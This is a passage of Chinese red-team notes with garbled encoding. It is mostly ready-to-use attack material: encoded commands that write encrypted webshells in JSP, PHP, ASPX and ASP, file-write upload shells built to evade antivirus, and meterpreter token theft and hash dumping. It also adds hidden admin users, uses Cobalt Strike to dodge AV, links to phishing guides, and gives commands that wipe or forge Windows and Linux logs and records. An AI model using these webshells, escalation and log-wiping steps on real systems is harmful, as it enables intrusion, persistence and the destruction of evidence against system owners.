3c2f6a73703a726f6f743e|xxd -r -ps > 111.jspx
```

**ï¼ˆ3ï¼‰php**

```
echo PD9waHAgQGVycm9yX3JlcG9ydGluZygwKTtzZXNzaW9uX3N0YXJ0KCk7JGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7JF9TRVNTSU9OWydrJ109JGtleTtzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7JHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7aWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSl7JHQ9ImJhc2U2NF8iLiJkZWNvZGUiOyRwb3N0PSR0KCRwb3N0LiIiKTtmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHskcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgfX1lbHNleyRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpO30kYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTskZnVuYz0kYXJyWzBdOyRwYXJhbXM9JGFyclsxXTtjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319QGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7Pz4K|base64 -d > 111.php

echo 3c3f70687020406572726f725f7265706f7274696e672830293b73657373696f6e5f737461727428293b246b65793d2265343565333239666562356439323562223b245f53455353494f4e5b276b275d3d246b65793b73657373696f6e5f77726974655f636c6f736528293b24706f73743d66696c655f6765745f636f6e74656e747328227068703a2f2f696e70757422293b69662821657874656e73696f6e5f6c6f6164656428276f70656e73736c2729297b24743d226261736536345f222e226465636f6465223b24706f73743d24742824706f73742e2222293b666f722824693d303b24693c7374726c656e2824706f7374293b24692b2b29207b24706f73745b24695d203d2024706f73745b24695d5e246b65795b24692b312631355d3b207d7d656c73657b24706f73743d6f70656e73736c5f646563727970742824706f73742c2022414553313238222c20246b6579293b7d246172723d6578706c6f646528277c272c24706f7374293b2466756e633d246172725b305d3b24706172616d733d246172725b315d3b636c61737320437b7075626c69632066756e6374696f6e205f5f696e766f6b6528247029207b6576616c2824702e2222293b7d7d4063616c6c5f757365725f66756e63286e6577204328292c24706172616d73293b3f3ea|xxd -r -ps > 111.php
```

**ï¼ˆ4ï¼‰aspx**

```
echo PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPjwlQEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5SZWZsZWN0aW9uIiU+PCVTZXNzaW9uLkFkZCgiayIsImU0NWUzMjlmZWI1ZDkyNWIiKTtieXRlW10gayA9IEVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoU2Vzc2lvblswXSArICIiKSxjID0gUmVxdWVzdC5CaW5hcnlSZWFkKFJlcXVlc3QuQ29udGVudExlbmd0aCk7QXNzZW1ibHkuTG9hZChuZXcgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5SaWpuZGFlbE1hbmFnZWQoKS5DcmVhdGVEZWNyeXB0b3IoaywgaykuVHJhbnNmb3JtRmluYWxCbG9jayhjLCAwLCBjLkxlbmd0aCkpLkNyZWF0ZUluc3RhbmNlKCJVIikuRXF1YWxzKHRoaXMpOyU+|base64 -d > 111.aspx

echo 3c25402050616765204c616e67756167653d2243232220253e3c2540496d706f7274204e616d6573706163653d2253797374656d2e5265666c656374696f6e22253e3c2553657373696f6e2e41646428226b222c226534356533323966656235643932356222293b627974655b5d206b203d20456e636f64696e672e44656661756c742e47657442797465732853657373696f6e5b305d202b202222292c63203d20526571756573742e42696e6172795265616428526571756573742e436f6e74656e744c656e677468293b417373656d626c792e4c6f6164286e65772053797374656d2e53656375726974792e43727970746f6772617068792e52696a6e6461656c4d616e6167656428292e437265617465446563727970746f72286b2c206b292e5472616e73666f726d46696e616c426c6f636b28632c20302c20632e4c656e67746829292e437265617465496e7374616e636528225522292e457175616c732874686973293b253e|xxd -r -ps > 111.aspx
```

**ï¼ˆ5ï¼‰asp**

```
echo PCUKUmVzcG9uc2UuQ2hhclNldCA9ICJVVEYtOCIgCms9ImU0NWUzMjlmZWI1ZDkyNWIiClNlc3Npb24oImsiKT1rCnNpemU9UmVxdWVzdC5Ub3RhbEJ5dGVzCmNvbnRlbnQ9UmVxdWVzdC5CaW5hcnlSZWFkKHNpemUpCkZvciBpPTEgVG8gc2l6ZQpyZXN1bHQ9cmVzdWx0JkNocihhc2NiKG1pZGIoY29udGVudCxpLDEpKSBYb3IgQXNjKE1pZChrLChpIGFuZCAxNSkrMSwxKSkpCk5leHQKZXhlY3V0ZShyZXN1bHQpCiU+|base64 -d > 111.asp
```



### äºŒæ¬¡æ³•

å¯¹äºäºŒæ¬¡æ³•ï¼Œå°±æ˜¯å…ˆä¼ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„å°â€œshellâ€,ç„¶åé€šè¿‡æŒ‡å®šæ–¹å¼è¿›è¡Œä¸Šä¼ å…¶ä»–æ–‡ä»¶ã€‚æœ‰ä¸€ä¸ªå¥½å¤„å°±æ˜¯ï¼Œå®ƒæœ¬èº«ä¸æ˜¯æœ¨é©¬ç—…æ¯’ï¼Œå°±æ˜¯ä¸€ä¸ªå†™å…¥æ–‡ä»¶çš„åŠŸèƒ½è„šæœ¬ï¼Œæ‰€ä»¥ä¸€èˆ¬æ€æ¯’ä¸ä¼šæ€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥éšæ„ä¸Šä¼ äº†ã€‚

**ï¼ˆaï¼‰JSP**

GETç±»å‹

**ï¼ˆ1ï¼‰god.jspå†…å®¹ ï¼ˆå…ˆé£éƒ¨é˜Ÿï¼‰**

```
<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
```

**ï¼ˆ2ï¼‰å†™jsp shell**

getç±»å‹å†™shelléœ€è¦æ³¨æ„urlç¼–ç ã€‚

```
http://ip/god.jsp?f=111.jsp&t=<%25@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%25><%25!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%25><%25if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%25>
```

**ï¼ˆ3ï¼‰å†™jspx shell**

```
http://ip/god.jsp?f=111.jspx&t=<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")%2B"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>
```

POSTç±»å‹

```
<%@ page language=â€javaâ€ pageEncoding=â€gbkâ€%>

<jsp:directive.page import="java.io.File"/>

<jsp:directive.page import="java.io.OutputStream"/>

<jsp:directive.page import="java.io.FileOutputStream"/>
<% int i=0;String method=request.getParameter(â€œactâ€);if(method!=null&&method.equals(â€œyocoâ€)){String url=request.getParameter(â€œurlâ€);String text=request.getParameter(â€œsmartâ€);File f=new File(url);if(f.exists()){f.delete();}try{OutputStream o=new FileOutputStream(f);o.write(text.getBytes());o.close();}catch(Exception e){i++;%>
error
<%}}if(i==0){%>
ok
<%}%>

<form action='?act=yoco' method='post'>

<input size="100" value="<%=application.getRealPath("/") %>" name="url"><br>

<textarea rows="20" cols="80" name="smart">
```

[![img](https://p5.ssl.qhimg.com/t01f1693061d1722e75.png)](https://p5.ssl.qhimg.com/t01f1693061d1722e75.png)

**ï¼ˆbï¼‰PHP**

GETç±»å‹

**ï¼ˆ1ï¼‰god.phpå†…å®¹ ï¼ˆå…ˆé£éƒ¨é˜Ÿï¼‰**

```
<?php fwrite(fopen($_GET['filename'], "w"), $_GET['content']);?>
```

**ï¼ˆ2ï¼‰å†™php shell**

```
http://host/god.php?filename=111.php&content=<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION['k']=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded('openssl')){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i%2B%2B) {$post[$i] = $post[$i]^$key[$i%2B1%2615]; }}else{$post=openssl_decrypt($post, "AES128", $key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p) {eval($p."");}}@call_user_func(new C(),$params);?>
```

POSTç±»å‹

```
<form method="post" enctype="multipart/form-data">Filename:<br /><input type="text" name="filename"><br />Content:<br /><textarea rows="20" cols="80" name="content"><?php fwrite(fopen($_POST['filename'], "w"), $_POST['content']);?>
```

[![img](https://p4.ssl.qhimg.com/t0180f99bff1cab790e.png)](https://p4.ssl.qhimg.com/t0180f99bff1cab790e.png)

**ï¼ˆcï¼‰ASPX**

å¯¹äºaspxæ¥è¯´ï¼Œæ­¤åŠŸèƒ½å¯èƒ½æ¯”è¾ƒé¸¡è‚‹ï¼Œå› ä¸ºaspxå†™æ–‡ä»¶éœ€è¦ä¸€å®šæƒé™ã€‚

GETç±»å‹

**ï¼ˆ1ï¼‰god.aspxå†…å®¹ ï¼ˆå…ˆé£éƒ¨é˜Ÿï¼‰**

```
<%@ Page Language="C#" %><% System.IO.File.WriteAllText(System.AppDomain.CurrentDomain.BaseDirectory+"\\"+Request.QueryString["filename"], Request.QueryString["content"]);%>
```

**ï¼ˆ2ï¼‰å†™aspx shell**

```
http://host/god.aspx?filename=god.aspx&content=<%@ Page Language="C%23" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b");byte[] k = Encoding.Default.GetBytes(Session[0] %2B ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
```









# é±¼å‰æ”»å‡»

https://www.freebuf.com/articles/web/260391.html é‚®ä»¶é’“é±¼å…¥é—¨åˆ°å…¥åœŸ

https://www.chabug.org/tools/2017.html é‚®ä»¶é’“é±¼å­¦ä¹ 

https://mp.weixin.qq.com/s?__biz=MjM5NzE1NjA0MQ%3D%3D&mid=2651202725&idx=1&sn=955fd4c6d80b320a57a3bc7b34fa24f8&scene=45 çº¢è“å¯¹æŠ—ä¹‹é‚®ä»¶é’“é±¼æ”»å‡»

https://mp.weixin.qq.com/s/DIY-Q4GhCVRm0Cp4r3BPkw  çº¢é˜ŸæŠ€å·§-ç½‘ç»œé’“é±¼

 



# æƒé™ç»´æŒ

æŒä¹…åŒ–å’Œææƒç›¸å…³



## ææƒæ£€æµ‹è„šæœ¬

unix-privesc-checkï¼šhttp://pentestmonkey.net/tools/audit/unix-privesc-check

linuxprivcheckerï¼š https://www.securitysift.com/download/linuxprivchecker.py

linEnum: http://qiniu.safe6.cn/LinEnum.sh

linux-exploit-suggester: https://github.com/HappyTreeFriend/linux-exploit-suggester

Windowsææƒè¾…åŠ©è„šæœ¬ï¼š https://github.com/pentestmonkey/windows-privesc-check



## åˆ©ç”¨msfææƒ

åˆ©ç”¨getsystem

(å¦‚æœææƒæˆåŠŸ,è¿›å…¥shellåè¿˜æ˜¯æ™®é€šç”¨æˆ·,å°±éœ€è¦è¿›è¡Œè¿›ç¨‹è¿ç§»)

```
getsystem
```

getguiæ·»åŠ ç®¡ç†å‘˜

```
run getgui -u test$ -p 123456
```

use incognitoï¼ˆåŠ è½½incognitoæ‰©å±•ï¼‰

åˆ©ç”¨åŠ è½½incognitoåçš„add_userå‘½ä»¤æ·»åŠ ç®¡ç†å‘˜

![image-20210107132946355](img/image-20210107132946355.png)

åˆ©ç”¨incognitoç›—å–ä»¤ç‰Œ

```
meterpreter >use incognito  åŠ è½½incogintoåŠŸèƒ½ï¼ˆç”¨æ¥ç›—çªƒç›®æ ‡ä¸»æœºçš„ä»¤ç‰Œæˆ–æ˜¯å‡å†’ç”¨æˆ·)

meterpreter >list_tokens -u  åˆ—å‡ºç›®æ ‡ä¸»æœºç”¨æˆ·çš„å¯ç”¨ä»¤ç‰Œ

meterpreter >list_tokens -g  åˆ—å‡ºç›®æ ‡ä¸»æœºç”¨æˆ·ç»„çš„å¯ç”¨ä»¤ç‰Œ

meterpreter >impersonate_token DOMAIN_NAME\\USERNAME  å‡å†’ç›®æ ‡ä¸»æœºä¸Šçš„å¯ç”¨ä»¤ç‰Œ,å¦‚meterpreter > impersonate_token QLWEB\\Administrato

meterpreter >execute -f cmd.exe -i -t #è°ƒç”¨åŸŸæƒé™shell

meterpreter > getuid

meterpreter>add_user 0xfa funny â€“h192.168.3.98 #åœ¨åŸŸæ§ä¸»æœºä¸Šæ·»åŠ è´¦æˆ·

meterpreter>reg command  # åœ¨ç›®æ ‡ä¸»æœºæ³¨å†Œè¡¨ä¸­è¿›è¡Œäº¤äº’ï¼Œåˆ›å»ºï¼Œåˆ é™¤ï¼ŒæŸ¥è¯¢ç­‰æ“ä½œ

meterpreter>setdesktop number  #åˆ‡æ¢åˆ°å¦ä¸€ä¸ªç”¨æˆ·ç•Œé¢ï¼ˆè¯¥åŠŸèƒ½åŸºäºå“ªäº›ç”¨æˆ·å·²ç™»å½•ï¼‰

meterpreter>ps #æŸ¥çœ‹ç›®æ ‡æœºå™¨è¿›ç¨‹ï¼Œæ‰¾å‡ºåŸŸæ§è´¦æˆ·è¿è¡Œçš„è¿›ç¨‹ID

meterpreter>steal_token pid #ç›—çªƒç»™å®šè¿›è¡Œçš„å¯ç”¨ä»¤ç‰Œå¹¶è¿›è¡Œä»¤ç‰Œå‡å†’

meterpreter>drop_token pid #åœæ­¢å‡å†’å½“å‰ä»¤ç‰Œ
```

![image-20210107133117637](img/image-20210107133117637.png)

åˆ©ç”¨hashdumpï¼ˆè·å–ç³»ç»Ÿhashå€¼å¹¶ç ´è§£,å‰ææ˜¯systemï¼‰

![image-20210107133210042](img/image-20210107133210042.png)

åˆ©ç”¨mimikatzæŠ“å¯†ç 





åˆ©ç”¨smart_hashdump



## å®‰å“é”å±ç ´è§£

å®‰å“ç ´è§£é”å±å¯ä»¥ æ‹¿keyç ´è§£,æˆ–è€…åˆ é™¤keyæ–‡ä»¶(/data/system/password.key)



## äº¤äº’shellè·å–

å¾ˆå¤šæ—¶å€™æˆ‘ä»¬è·å–çš„shellå¹¶ä¸æ˜¯ä¸€ä¸ªå…·æœ‰å®Œæ•´äº¤äº’çš„shellï¼Œå¯¹äºå·²ç»å®‰è£…äº†pythonçš„ç³»ç»Ÿï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨pythonæä¾›çš„ptyæ¨¡å—ï¼Œåªéœ€è¦ä¸€è¡Œè„šæœ¬å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªåŸç”Ÿçš„ç»ˆç«¯

```text
python3 -c "import pty;pty.spawn('/bin/bash')"
python2 -c 'import pty;pty.spawn("/bin/sh")'
```







## æ— äº¤äº’è´¦å·æ·»åŠ 

**chpasswd æ–¹æ³•**

```bash
useradd newuser;echo "newuser:password"|chpasswd
```

**useradd -p æ–¹æ³•**

```bash
useradd -p `openssl passwd 123456` guest

useradd -p "$(openssl passwd 123456)" guest
```

**echo -e æ–¹æ³•**

```text
useradd newuwer;echo -e "123456\n123456\n" |passwd newuser
```



## Cobalt Strikeç¬”è®°



### argueå‚æ•°æ±¡æŸ“

æ¡ä»¶ï¼šä½¿ç”¨adminstratoræˆ–systemæƒé™

åœºæ™¯ï¼šæœºå™¨ä¸Šçº¿åï¼Œæ— æ³•æ‰§è¡Œå‘½ä»¤è¢«avæ‹¦æˆªã€‚

Use:

```
argue [command] [fake arguments]
```

æ³¨æ„ï¼šfake argumentsåº”è¯¥æ¯”çœŸå®çš„è¦é•¿

ä¾‹å­ï¼š

æ±¡æŸ“powershellï¼Œæ±¡æŸ“å®Œåå³å¯æ­£å¸¸æ‰§è¡Œpowershell

```
argue powershell.exe xsdffsdfwfws
```



## bypass disable_function

å‚è€ƒæ–‡ç« :https://www.anquanke.com/post/id/208451#h2-8

https://www.cnblogs.com/tr1ple/p/11213732.html

å¸¸ç”¨æ–¹æ³•:

```
1. æ”»å‡»åç«¯ç»„ä»¶ï¼Œå¯»æ‰¾å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„ã€web åº”ç”¨å¸¸ç”¨çš„åç«¯ç»„ä»¶ï¼Œå¦‚ï¼ŒImageMagick çš„é­”å›¾æ¼æ´ã€bash çš„ç ´å£³æ¼æ´
2. å¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰ system()ã€exec()ã€shell_exec()ã€passthru()ï¼Œååƒ»çš„ popen()ã€proc_open()ã€pcntl_exec()
3. mod_cgi æ¨¡å¼ï¼Œå°è¯•ä¿®æ”¹ .htaccessï¼Œè°ƒæ•´è¯·æ±‚è®¿é—®è·¯ç”±ï¼Œç»•è¿‡ php.ini ä¸­çš„ä»»ä½•é™åˆ¶
4. åˆ©ç”¨ç¯å¢ƒå˜é‡ LD_PRELOAD åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œè®©å¤–éƒ¨ç¨‹åºåŠ è½½æ¶æ„ *.soï¼Œè¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ•ˆæœ
```



## éš§é“å·¥å…·

chiselï¼šä¸€æ¬¾å¿«é€Ÿç¨³å®šçš„éš§é“å·¥å…· https://www.anquanke.com/post/id/234771







# ç—•è¿¹æ¸…ç†

## windowsæ¸…ç†

### æ—¥å¿—æ¸…é™¤

**windows æ—¥å¿—è·¯å¾„ï¼š**

```
ç³»ç»Ÿæ—¥å¿—ï¼š%SystemRoot%\System32\Winevt\Logs\System.evtx
å®‰å…¨æ—¥å¿—ï¼š%SystemRoot%\System32\Winevt\Logs\Security.evtx
åº”ç”¨ç¨‹åºæ—¥å¿—ï¼š%SystemRoot%\System32\Winevt\Logs\Application.evtx
æ—¥å¿—åœ¨æ³¨å†Œè¡¨çš„é”®ï¼šHKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog
```

**windows æ—¥å¿—æ¸…é™¤æ–¹å¼ï¼š**

**ï¼ˆ1ï¼‰æœ€ç®€å•ç²—æš´çš„æ–¹å¼**

å¼€å§‹â†’è¿è¡Œ,è¾“å…¥ `eventvwr` è¿›å…¥äº‹ä»¶æŸ¥çœ‹å™¨ï¼Œå³è¾¹æ é€‰æ‹©æ¸…é™¤æ—¥å¿—ã€‚

**ï¼ˆ2ï¼‰å‘½ä»¤è¡Œä¸€é”®æ¸…é™¤Windowsäº‹ä»¶æ—¥å¿—**

```
PowerShell -Command "& {Clear-Eventlog -Log Application,System,Security}"
Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname}
```

**ï¼ˆ3ï¼‰åˆ©ç”¨è„šæœ¬åœæ­¢æ—¥å¿—çš„è®°å½•**

é€šè¿‡è¯¥è„šæœ¬éå†äº‹ä»¶æ—¥å¿—æœåŠ¡è¿›ç¨‹ï¼ˆä¸“ç”¨svchost.exeï¼‰çš„çº¿ç¨‹å †æ ˆï¼Œå¹¶æ ‡è¯†äº‹ä»¶æ—¥å¿—çº¿ç¨‹ä»¥æ€æ­»äº‹ä»¶æ—¥å¿—æœåŠ¡çº¿ç¨‹ã€‚

å› æ­¤ï¼Œç³»ç»Ÿå°†æ— æ³•æ”¶é›†æ—¥å¿—ï¼ŒåŒæ—¶äº‹ä»¶æ—¥å¿—æœåŠ¡ä¼¼ä¹æ­£åœ¨è¿è¡Œã€‚

```
githubé¡¹ç›®åœ°å€ï¼šhttps://github.com/hlldz/Invoke-Phant0m
```

**ï¼ˆ4ï¼‰Windowså•æ¡æ—¥å¿—æ¸…é™¤**

è¯¥å·¥å…·ä¸»è¦ç”¨äºä»Windowsäº‹ä»¶æ—¥å¿—ä¸­åˆ é™¤æŒ‡å®šçš„è®°å½•ã€‚

```
githubé¡¹ç›®åœ°å€ï¼šhttps://github.com/QAX-A-Team/EventCleaner
```

**ï¼ˆ5ï¼‰Windowsæ—¥å¿—ä¼ªé€ **

ä½¿ç”¨eventcreateè¿™ä¸ªå‘½ä»¤è¡Œå·¥å…·æ¥ä¼ªé€ æ—¥å¿—æˆ–è€…ä½¿ç”¨è‡ªå®šä¹‰çš„å¤§é‡åƒåœ¾ä¿¡æ¯è¦†ç›–ç°æœ‰æ—¥å¿—ã€‚

```
eventcreate -l system -so administrator -t warning -d "this is a test" -id 500
```

**IISæ—¥å¿—**

IISé»˜è®¤æ—¥å¿—è·¯å¾„ï¼š

```
%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\
```

æ¸…é™¤WWWæ—¥å¿—ï¼š

```cmd
åœæ­¢æœåŠ¡ï¼šnet stop w3svc
åˆ é™¤æ—¥å¿—ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼šdel *.*
å¯ç”¨æœåŠ¡ï¼šnet start w3svc
```

### æ°¸ä¹…æ“¦é™¤æŠ€å·§

***åˆ©ç”¨Windowsè‡ªå¸¦å‘½ä»¤è¿›è¡Œå®‰å…¨æ“¦é™¤***

**ï¼ˆ1ï¼‰Shift+Deleteå¿«æ·é”®æ°¸ä¹…åˆ é™¤**

ç›´æ¥åˆ é™¤æ–‡ä»¶ï¼Œè¿˜æ˜¯èƒ½åœ¨å›æ”¶ç«™æ‰¾åˆ°çš„ï¼Œä½¿ç”¨Shift+Deleteå¿«æ·é”®å¯ä»¥ç›´æ¥æ°¸ä¹…åˆ é™¤äº†ã€‚ä½†æ˜¯ç”¨æ•°æ®æ¢å¤è½¯ä»¶ï¼Œåˆ é™¤çš„æ–‡ä»¶å°½å¿«æ¢å¤ï¼Œå¦åˆ™æ–°çš„æ–‡ä»¶å­˜å…¥è¦†ç›–äº†åŸæ¥çš„æ–‡ä»¶ç—•è¿¹å°±å¾ˆéš¾æ¢å¤äº†ã€‚

**ï¼ˆ2ï¼‰Cipher å‘½ä»¤å¤šæ¬¡è¦†å†™**

åœ¨åˆ é™¤æ–‡ä»¶åï¼Œå¯ä»¥åˆ©ç”¨Cipher å‘½ä»¤é€šè¿‡ /W å‚æ•°å¯åå¤å†™å…¥å…¶ä»–æ•°æ®è¦†ç›–å·²åˆ é™¤æ–‡ä»¶çš„ç¡¬ç›˜ç©ºé—´ï¼Œå½»åº•åˆ é™¤æ•°æ®é˜²æ­¢è¢«æ¢å¤ã€‚

æ¯”å¦‚ï¼Œåˆ é™¤`D:\tools`ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œè¿™æ¡å‘½ä»¤ï¼š

```
cipher /w:D:\tools
```

è¿™æ ·ä¸€æ¥ï¼ŒD ç›˜ä¸Šæœªä½¿ç”¨ç©ºé—´å°±ä¼šè¢«è¦†ç›–ä¸‰æ¬¡ï¼šä¸€æ¬¡ 0x00ã€ä¸€æ¬¡ 0xFFï¼Œä¸€æ¬¡éšæœºæ•°ï¼Œæ‰€æœ‰è¢«åˆ é™¤çš„æ–‡ä»¶å°±éƒ½ä¸å¯èƒ½è¢«æ¢å¤äº†ã€‚

**ï¼ˆ3ï¼‰Formatå‘½ä»¤è¦†ç›–æ ¼å¼åŒ–**

Format å‘½ä»¤åŠ ä¸Š /P å‚æ•°åï¼Œå°±ä¼šæŠŠæ¯ä¸ªæ‰‡åŒºå…ˆæ¸…é›¶ï¼Œå†ç”¨éšæœºæ•°è¦†ç›–ã€‚è€Œä¸”å¯ä»¥è¦†ç›–å¤šæ¬¡ã€‚æ¯”å¦‚ï¼š

```
format D: /P:8
```

è¿™æ¡å‘½ä»¤è¡¨ç¤ºæŠŠ D ç›˜ç”¨éšæœºæ•°è¦†ç›– 8 æ¬¡ã€‚

### æ¸…é™¤è¿œç¨‹æ¡Œé¢è¿æ¥è®°å½•

å½“é€šè¿‡æœ¬æœºè¿œç¨‹è¿æ¥å…¶ä»–å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨åï¼Œä¼šåœ¨æœ¬æœºå­˜ç•™è¿œç¨‹æ¡Œé¢è¿æ¥è®°å½•ã€‚ä»£ç ä¿å­˜ä¸º`clear.bat`æ–‡ä»¶ï¼ŒåŒå‡»è¿è¡Œå³å¯è‡ªåŠ¨åŒ–æ¸…é™¤è¿œç¨‹æ¡Œé¢è¿æ¥è®°å½•ã€‚

```cmd
@echo off
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
cd %userprofile%\documents\attrib Default.rdp -s -h
del Default.rdp
```

### åˆ©ç”¨Metasploit ç—•è¿¹æ¸…é™¤

ï¼ˆ1ï¼‰æŸ¥çœ‹äº‹ä»¶æ—¥å¿—

```bash
meterpreter > run event_manager  -i   
[*] Retriving Event Log Configuration

Event Logs on System
====================

 Name                    Retention  Maximum Size  Records 
 ----                    ---------  ------------  ------- 
 Application             Disabled   20971520K     2149 
 HardwareEvents          Disabled   20971520K     0 
 Internet Explorer       Disabled   K             0 
 Key Management Service  Disabled   20971520K     0 
 Security                Disabled   20971520K     1726 
 System                  Disabled   20971520K     3555 
 Windows PowerShell      Disabled   15728640K     138
```
ï¼ˆ2ï¼‰æ¸…é™¤äº‹ä»¶æ—¥å¿—ï¼ˆåŒ…æ‹¬å…­ç§æ—¥å¿—ç±»å‹ï¼‰

```bash
meterpreter > run event_manager  -c
```

ï¼ˆ3ï¼‰å¦å¤–ï¼Œä¹Ÿå¯ä»¥è¾“å…¥clearvå‘½ä»¤æ¸…é™¤ç›®æ ‡ç³»ç»Ÿçš„äº‹ä»¶æ—¥å¿—ï¼ˆä»…åŒ…å«ä¸‰ç§æ—¥å¿—ç±»å‹ï¼‰

```bash
meterpreter > clearev 
[*] Wiping 4 records from Application...
[*] Wiping 8 records from System...
[*] Wiping 7 records from Security...
```

## linuxæ¸…ç†

### æ—¥å¿—æ¸…é™¤

```cmd
/var/log/btmp   è®°å½•æ‰€æœ‰ç™»å½•å¤±è´¥ä¿¡æ¯ï¼Œä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹
/var/log/lastlog è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´çš„æ—¥å¿—ï¼Œä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹
/var/log/wtmp    è®°å½•æ‰€æœ‰ç”¨æˆ·çš„ç™»å½•ã€æ³¨é”€ä¿¡æ¯ï¼Œä½¿ç”¨lastå‘½ä»¤æŸ¥çœ‹
/var/log/utmp    è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä½¿ç”¨w,who,usersç­‰å‘½ä»¤æŸ¥çœ‹
/var/log/secure   è®°å½•ä¸å®‰å…¨ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯
/var/log/message  è®°å½•ç³»ç»Ÿå¯åŠ¨åçš„ä¿¡æ¯å’Œé”™è¯¯æ—¥å¿—
```

**ç¬¬ä¸€ç§æ–¹å¼ï¼šæ¸…ç©ºæ—¥å¿—æ–‡ä»¶**

æ¸…é™¤ç™»å½•ç³»ç»Ÿå¤±è´¥çš„è®°å½•ï¼š

```bash
[root@centos]# echo > /var/log/btmp 
[root@centos]# lastb             //æŸ¥è¯¢ä¸åˆ°ç™»å½•å¤±è´¥ä¿¡æ¯
```

æ¸…é™¤ç™»å½•ç³»ç»ŸæˆåŠŸçš„è®°å½•ï¼š

```bash
[root@centos]# echo > /var/log/wtmp  
[root@centos]# last              //æŸ¥è¯¢ä¸åˆ°ç™»å½•æˆåŠŸçš„ä¿¡æ¯
```

æ¸…é™¤ç›¸å…³æ—¥å¿—ä¿¡æ¯ï¼š

```cmd
æ¸…é™¤ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´ï¼šecho > /var/log/lastlog          #lastlogå‘½ä»¤
æ¸…é™¤å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ï¼šecho >   /var/log/utmp             #ä½¿ç”¨w,who,usersç­‰å‘½ä»¤
æ¸…é™¤å®‰å…¨æ—¥å¿—è®°å½•ï¼šcat /dev/null >  /var/log/secure
æ¸…é™¤ç³»ç»Ÿæ—¥å¿—è®°å½•ï¼šcat /dev/null >  /var/log/message
```

**ç¬¬äºŒç§æ–¹å¼ï¼šåˆ é™¤/æ›¿æ¢éƒ¨åˆ†æ—¥å¿—**

